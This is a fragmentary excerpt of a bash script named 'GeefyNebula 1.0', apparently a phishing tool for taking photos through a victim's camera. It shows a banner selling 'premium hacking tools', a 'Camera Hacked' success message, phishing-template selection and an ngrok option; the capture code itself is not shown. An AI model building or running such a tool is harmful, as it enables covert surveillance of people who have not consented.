#!/bin/bash
# GeefyNebula 1.0
# Powered By Techipnet | Bocil Multi
# Credit Techipnet
...
banner() {
clear
printf " \e[1;93m GeefyNebula 1.0 \e[0m \n"


printf " \e[1;77m wa.me/6281285148482 (For Buy Premium Hacking Tools) | youtube.com/@BocilMulti (My Youtube Channel) \e[0m \n"


printf " \e[1;77m Youtube Live Templates NOT WORKING! \e[0m \n"
...
if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Camera Hacked (The Photo Will Saved On Data Directory) \e[0m\n"
rm -rf Log.log
fi
sleep 0.5
...
printf "\e[1;93m [!] You Selected A Invalid Templates! TRY AGAIN! \e[0m\n"
sleep 1
select_template
fi
fi
...
printf "\n-----Select 1 Of The Option (NGROK Still Beta)----- \n"    
